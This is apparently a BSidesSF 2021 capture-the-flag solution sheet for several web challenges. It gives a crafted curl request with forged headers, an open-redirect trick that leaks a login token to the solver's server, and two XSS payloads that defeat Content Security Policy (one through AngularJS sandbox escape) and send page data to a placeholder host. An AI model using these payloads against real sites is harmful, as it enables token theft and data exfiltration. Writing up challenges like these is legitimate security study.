# BSidesSF 2021

## Thin Mint

```
tm_admin: 1
tm_user: 21232f297a57a5a743894a0e4a801fc3
```

## Higher Hurdles

```bash
curl -I  https://username:4ef03423738a4aa7956528feebbc65474c053f5937032dfb9219af62@higher-hurdles-74a23189.challenges.bsidessf.net/hurdles/\!\!\?retrieve\=flag\&%26%3D%26%3D%26\=%2500%0a -X PUT -A "1337 v.9001" -H "X-Forwarded-For: 13.37.37.13,19.18.0.1,19.18.0.1,10.5.4.3,10.5.4.3,127.1.1.1,127.1.1.1"  -b "Fortune=6265" -H "Accept: text/plain" -H "Accept-Language: de" -H "Origin: https://ctf.bsidessf.net" -H "Referer: https://ctf.bsidessf.net/challenges" -H "DNT: 1" -H "Sec-Fetch-Site: same-origin" -H "Sec-Fetch-Mode: navigate" -H "Sec-Fetch-User: ?1"
```

## CuteSrv

* get TOKEN by submitting `https://loginsvc-0af88b56.challenges.bsidessf.net/check?continue=YOUR_VPS`
* authorize with `https://cutesrv-0186d981.challenges.bsidessf.net/setsid?authtok=TOKEN`
* visit `/flag.txt`


## CSP 1

```javascript
<iframe src='x' onload='fetch("/csp-one-flag").then(r => r.text()).then(r => fetch(`http://xxxx/?flag=${r}`,{'mode':'no-cors'}))'>
```
## CSP 2

```javascript
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
 <div ng-app ng-csp>
  {{ x = $on.curry.call().eval("fetch("/csp-two-flag").then(r => r.text()).then(r => fetch(`http://xxxx/?flag=${r}`,{'mode':'no-cors'}))") }}
 </div>
```